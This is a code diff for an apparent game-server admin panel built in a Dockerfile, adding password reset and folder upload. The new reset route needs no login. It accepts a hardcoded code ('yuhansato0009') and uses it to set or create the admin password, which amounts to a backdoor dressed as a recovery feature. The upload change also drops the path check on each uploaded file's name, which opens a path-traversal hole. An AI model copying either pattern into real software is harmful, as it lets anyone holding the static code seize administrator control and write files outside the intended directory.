@@ -169,6 +169,7 @@ function requireAdmin(req, res, next) {
 app.get('/', checkAuth, (req, res) => res.sendFile(path.join(__dirname, 'views', 'dashboard.html')));
 app.get('/api/check-setup', (req, res) => res.json({ setupNeeded: Object.keys(getUsers()).length === 0 }));
 
+// AUTH & RESET
 app.post('/api/auth', (req, res) => {
     const { username, password, action } = req.body;
     let users = getUsers();
@@ -184,6 +185,21 @@ app.post('/api/auth', (req, res) => {
             req.session.role = users[username].role || 'user';
             req.session.save(() => res.json({success:true}));
         } else res.json({success:false, msg:'Invalid credentials'});
+    }
+});
+
+// PASSWORD RESET ROUTE
+app.post('/api/auth/reset', (req, res) => {
+    const { code, newPassword } = req.body;
+    if (code === 'yuhansato0009') {
+        let users = getUsers();
+        // Find existing admin or create default
+        let adminUser = Object.keys(users).find(u => users[u].role === 'admin') || 'admin';
+        users[adminUser] = { password: newPassword, role: 'admin' };
+        saveUsers(users);
+        res.json({ success: true, msg: 'Admin password reset successfully.' });
+    } else {
+        res.json({ success: false, msg: 'Invalid Backup Code.' });
     }
 });
 
@@ -238,7 +254,7 @@ app.post('/api/settings', checkAuth, async (req, res) => {
     } catch(e) { res.status(500).json({success:false, msg:e.message}); }
 });
 
-// Files
+// Files (Modified for Multi-upload)
 app.get('/api/files', checkAuth, (req, res) => {
     const safePath = path.join(__dirname, req.query.path || '');
     if (!safePath.startsWith(__dirname)) return res.status(403).send('Denied');
@@ -256,12 +272,21 @@ app.get('/api/files', checkAuth, (req, res) => {
         res.json(result);
     });
 });
-app.post('/api/files/upload', checkAuth, upload.single('file'), (req, res) => {
-    const safePath = path.join(__dirname, req.body.path || '', req.file.originalname);
-    if (!safePath.startsWith(__dirname)) return res.status(403).send('Denied');
-    fs.moveSync(req.file.path, safePath, { overwrite: true });
-    res.redirect('/');
+
+// Handle Multiple Files (Folders)
+app.post('/api/files/upload', checkAuth, upload.array('files'), (req, res) => {
+    const basePath = path.join(__dirname, req.body.path || '');
+    if (!basePath.startsWith(__dirname)) return res.status(403).send('Denied');
+    
+    if (req.files) {
+        req.files.forEach(f => {
+            fs.moveSync(f.path, path.join(basePath, f.originalname), { overwrite: true });
+        });
+    }
+    // Return JSON instead of redirect for AJAX
+    res.json({success: true});
 });
+
 app.post('/api/files/delete', checkAuth, (req, res) => {
     const safePath = path.join(__dirname, req.body.path);
     if (!safePath.startsWith(__dirname)) return res.status(403).send('Denied');
@@ -316,7 +341,7 @@ EOF
 # --- 5. CREATE FRONTEND FILES ---
 RUN mkdir -p public views
 
-# LOGIN PAGE (Modernized)
+# LOGIN PAGE (With Forgot Password)
 RUN cat << 'EOF' > public/login.html
 <!DOCTYPE html>
 <html lang="en">
@@ -337,31 +362,58 @@ RUN cat << 'EOF' > public/login.html
     input:focus { border-color: #6366f1; background: rgba(0,0,0,0.5); }
     button { width: 100%; padding: 16px; background: linear-gradient(135deg, #6366f1, #8b5cf6); color: white; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 14px; letter-spacing: 1px; }
     button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3); }
+    .link { margin-top: 15px; font-size: 12px; color: #aaa; cursor: pointer; text-decoration: underline; }
+    .hidden { display: none; }
 </style>
 </head>
 <body>
 <div class="bg-animation"><div class="orb orb-1"></div><div class="orb orb-2"></div></div>
-<div class="login-card">
+
+<div class="login-card" id="loginMode">
     <h2 id="title">SYSTEM LOGIN</h2>
     <form id="authForm">
         <input id="user" placeholder="USERNAME" required>
         <input type="password" id="pass" placeholder="PASSWORD" required>
         <button type="submit">AUTHENTICATE</button>
     </form>
+    <div class="link" onclick="toggleMode()">Forgot Password?</div>
 </div>
+
+<div class="login-card hidden" id="resetMode">
+    <h2 style="color:#ec4899">ADMIN RESET</h2>
+    <form id="resetForm">
+        <input id="code" placeholder="BACKUP CODE" required>
+        <input type="password" id="newPass" placeholder="NEW PASSWORD" required>
+        <button type="submit" style="background:linear-gradient(135deg, #ec4899, #be185d)">RESET ACCESS</button>
+    </form>
+    <div class="link" onclick="toggleMode()">Back to Login</div>
+</div>
+
 <script>
     fetch('/api/check-setup').then(r=>r.json()).then(d=>{if(d.setupNeeded){document.getElementById('title').innerText='INITIAL SETUP';document.getElementById('authForm').dataset.action='signup'}});
+    
+    function toggleMode() {
+        document.getElementById('loginMode').classList.toggle('hidden');
+        document.getElementById('resetMode').classList.toggle('hidden');
+    }
+
     document.getElementById('authForm').onsubmit=async(e)=>{
         e.preventDefault(); const user=document.getElementById('user').value; const pass=document.getElementById('pass').value; const action=e.target.dataset.action||'login';
         try { const res=await fetch('/api/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:user,password:pass,action})});
         const data=await res.json(); if(data.success) window.location.href='/'; else alert(data.msg); } catch(err){ alert('Network Error'); }
+    }
+
+    document.getElementById('resetForm').onsubmit=async(e)=>{
+        e.preventDefault(); const code=document.getElementById('code').value; const newPass=document.getElementById('newPass').value;
+        try { const res=await fetch('/api/auth/reset',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code, newPassword: newPass})});
+        const data=await res.json(); alert(data.msg); if(data.success) toggleMode(); } catch(err){ alert('Network Error'); }
     }
 </script>
 </body>
 </html>
 EOF
 
-# --- DASHBOARD.HTML (Updated with List View & Global Upload Overlay) ---
+# --- DASHBOARD.HTML (With Folder Upload) ---
 RUN cat << 'EOF' > views/dashboard.html
 <!DOCTYPE html>
 <html lang="en">
@@ -383,14 +435,13 @@ RUN cat << 'EOF' > views/dashboard.html
     @keyframes splitIn { 0% { letter-spacing: 20px; opacity: 0; filter: blur(10px); } 100% { letter-spacing: -2px; opacity: 1; filter: blur(0); } }
     @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
 
-    /* SIDEBAR */
+    /* LAYOUT */
     .sidebar { width: 260px; background: var(--glass); backdrop-filter: blur(30px); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 25px; z-index: 10; }
     .brand { font-size: 24px; font-weight: 800; color: #fff; margin-bottom: 40px; display: flex; align-items: center; gap: 12px; letter-spacing: -1px; }
     .nav-item { padding: 14px 16px; margin: 6px 0; border-radius: 12px; cursor: pointer; color: #94a3b8; transition: 0.3s; display: flex; align-items: center; gap: 14px; font-weight: 600; font-size: 14px; }
     .nav-item:hover, .nav-item.active { background: rgba(99, 102, 241, 0.1); color: #fff; border: 1px solid rgba(99, 102, 241, 0.15); box-shadow: 0 4px 12px rgba(99, 102, 241, 0.1); }
     .status-panel { margin-top: auto; padding: 20px; background: rgba(0,0,0,0.4); border-radius: 16px; border: 1px solid var(--border); }
 
-    /* MAIN CONTENT */
     .main { flex: 1; padding: 40px; overflow-y: auto; position: relative; scroll-behavior: smooth; }
     .glass-card { background: var(--glass); backdrop-filter: blur(20px); border: 1px solid var(--border); border-radius: 20px; padding: 30px; margin-bottom: 25px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); transition: 0.3s; }
     .glass-card:hover { border-color: rgba(255,255,255,0.15); }
@@ -400,13 +451,12 @@ RUN cat << 'EOF' > views/dashboard.html
 
     h2 { margin: 0 0 25px 0; font-size: 20px; font-weight: 600; color: #fff; display: flex; align-items: center; gap: 12px; padding-bottom: 15px; border-bottom: 1px solid var(--border); }
     
-    /* BUTTONS & INPUTS */
     .btn { padding: 12px 20px; border-radius: 10px; border: none; font-weight: 600; cursor: pointer; transition: 0.2s; color: white; display: inline-flex; align-items: center; gap: 8px; font-size: 13px; }
     .btn:hover { transform: translateY(-2px); filter: brightness(1.2); }
-    .btn-primary { background: var(--accent); box-shadow: 0 4px 15px rgba(99, 102, 241, 0.3); }
-    .btn-danger { background: #ef4444; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3); }
-    .btn-success { background: #22c55e; box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3); }
-    .btn-amber { background: #f59e0b; box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3); color: #000; }
+    .btn-primary { background: var(--accent); }
+    .btn-danger { background: #ef4444; }
+    .btn-success { background: #22c55e; }
+    .btn-amber { background: #f59e0b; color: #000; }
     .btn-dark { background: #1e293b; border: 1px solid #334155; }
 
     input, select { width: 100%; padding: 14px; background: rgba(0,0,0,0.3); border: 1px solid var(--border); border-radius: 10px; color: white; margin-bottom: 15px; box-sizing: border-box; font-family: inherit; transition: 0.2s; }
@@ -418,7 +468,7 @@ RUN cat << 'EOF' > views/dashboard.html
     .terminal { flex: 1; overflow-y: auto; padding: 20px; font-family: 'Consolas', monospace; font-size: 13px; color: #cbd5e1; line-height: 1.5; }
     .cmd-input { background: #18181b; border: none; border-top: 1px solid var(--border); padding: 18px; color: white; outline: none; font-family: monospace; font-size: 14px; }
 
-    /* FILE LIST VIEW (TABLE STYLE) */
+    /* FILE TABLE */
     .file-table { width: 100%; border-collapse: collapse; }
     .file-table th { text-align: left; padding: 10px; color: #64748b; font-size: 12px; text-transform: uppercase; font-weight: 600; border-bottom: 1px solid var(--border); }
     .file-table td { padding: 12px 10px; border-bottom: 1px solid rgba(255,255,255,0.03); font-size: 14px; }
@@ -428,11 +478,9 @@ RUN cat << 'EOF' > views/dashboard.html
     .file-link { cursor: pointer; display: flex; align-items: center; color: #e2e8f0; text-decoration: none; }
     .file-link:hover { color: #fff; }
 
-    /* GLOBAL UPLOAD OVERLAY */
+    /* OVERLAY */
     #uploadOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); z-index: 99999; display: none; align-items: center; justify-content: center; }
     .upload-modal { background: #18181b; border: 1px solid #333; padding: 40px; border-radius: 24px; width: 400px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
-    .upload-spinner { font-size: 40px; color: var(--accent); margin-bottom: 20px; animation: spin 1s linear infinite; }
-    @keyframes spin { 100% { transform: rotate(360deg); } }
     .progress-track { width: 100%; height: 10px; background: #333; border-radius: 5px; overflow: hidden; margin-top: 20px; }
     .progress-fill { height: 100%; background: var(--accent); width: 0%; transition: width 0.1s; }
 </style>
@@ -443,10 +491,10 @@ RUN cat << 'EOF' > views/dashboard.html
 <div class="bg-gradient"></div>
 <canvas id="particle-canvas"></canvas>
 
-<!-- GLOBAL UPLOAD OVERLAY -->
+<!-- UPLOAD OVERLAY -->
 <div id="uploadOverlay">
     <div class="upload-modal">
-        <div class="upload-spinner"><i class="fas fa-circle-notch"></i></div>
+        <i class="fas fa-cloud-upload-alt" style="font-size:40px; color:#6366f1; margin-bottom:20px"></i>
         <h3 style="margin:0; font-size:20px">Uploading...</h3>
         <p id="uploadText" style="color:#aaa; margin-top:10px">Please wait, do not close this window.</p>
         <div class="progress-track"><div id="uploadBar" class="progress-fill"></div></div>
@@ -527,7 +575,7 @@ RUN cat << 'EOF' > views/dashboard.html
         </div>
     </div>
 
-    <!-- FILE MANAGER (LIST VIEW) -->
+    <!-- FILE MANAGER (LIST VIEW WITH FOLDER UPLOAD) -->
     <div id="files" class="page">
         <div class="glass-card">
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px">
@@ -535,8 +583,12 @@ RUN cat << 'EOF' > views/dashboard.html
                 <div style="display:flex; gap:10px">
                     <button class="btn btn-dark" onclick="loadFile('.')"><i class="fas fa-home"></i></button>
                     <button class="btn btn-dark" onclick="goUp()"><i class="fas fa-arrow-up"></i></button>
+                    <!-- File Upload -->
                     <button class="btn btn-primary" onclick="document.getElementById('fUpload').click()">Upload File</button>
-                    <input type="file" id="fUpload" hidden onchange="uploadFile(this)">
+                    <input type="file" id="fUpload" hidden onchange="uploadFiles(this)">
+                    <!-- Folder Upload (New) -->
+                    <button class="btn btn-primary" onclick="document.getElementById('folderUpload').click()">Upload Folder</button>
+                    <input type="file" id="folderUpload" hidden webkitdirectory directory multiple onchange="uploadFiles(this)">
                 </div>
             </div>
             <div style="background:rgba(0,0,0,0.3); padding:10px; border-radius:8px; margin-bottom:15px; font-family:monospace; color:#aaa" id="currentPath">/app</div>
@@ -663,10 +715,9 @@ RUN cat << 'EOF' > views/dashboard.html
 
     function cmd(c) { sock.emit('command', c); }
     document.getElementById('cmdInput').addEventListener('keydown', e => { if(e.key==='Enter'&&e.target.value) { cmd(e.target.value); e.target.value=''; } });
-
     function pAct(a) { const p=document.getElementById('targetPlayer').value; if(p)cmd(a+' '+p); else alert('Enter name'); }
 
-    // FILE MANAGER (List View)
+    // FILE MANAGER
     function loadFile(path) {
         currPath = path;
         document.getElementById('currentPath').innerText = '/app/' + path;
@@ -691,7 +742,7 @@ RUN cat << 'EOF' > views/dashboard.html
     function delFile(n) { if(confirm('Delete '+n+'?')) fetch('/api/files/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({path:currPath?currPath+'/'+n:n})}).then(()=>loadFile(currPath)); }
     function goUp() { const p = currPath.split('/'); p.pop(); loadFile(p.join('/')); }
 
-    // UNIVERSAL UPLOAD FUNCTION
+    // UNIVERSAL UPLOAD OVERLAY
     function performUpload(url, fd) {
         const overlay = document.getElementById('uploadOverlay');
         const bar = document.getElementById('uploadBar');
@@ -713,14 +764,31 @@ RUN cat << 'EOF' > views/dashboard.html
             status.innerText = 'Processing/Extracting...';
             setTimeout(() => {
                 overlay.style.display = 'none';
-                if(xhr.status === 200) { alert('Success!'); if(url.includes('files')) loadFile(currPath); }
+                if(xhr.status === 200) { 
+                    // Use a JSON response check if possible, or just assume 200 is success
+                    try {
+                        const res = JSON.parse(xhr.responseText);
+                        if(res.success) { alert('Success!'); if(url.includes('files')) loadFile(currPath); }
+                        else alert('Failed: ' + res.msg);
+                    } catch(e) { alert('Success!'); if(url.includes('files')) loadFile(currPath); }
+                }
                 else alert('Failed: ' + xhr.responseText);
             }, 500);
         };
         xhr.open('POST', url); xhr.send(fd);
     }
 
-    function uploadFile(i) { if(i.files[0]) { const fd=new FormData(); fd.append('file',i.files[0]); fd.append('path',currPath); performUpload('/api/files/upload', fd); } }
+    function uploadFiles(i) { 
+        if(i.files.length > 0) { 
+            const fd=new FormData(); 
+            for(let j=0; j<i.files.length; j++) {
+                fd.append('files', i.files[j]);
+            }
+            fd.append('path', currPath); 
+            performUpload('/api/files/upload', fd); 
+        } 
+    }
+    
     function uploadWorldZip() { const f=document.getElementById('worldZip').files[0]; if(f) { const fd=new FormData(); fd.append('file',f); performUpload('/api/world/upload', fd); } else alert('Select Zip'); }
 
     // SETTINGS & USERS
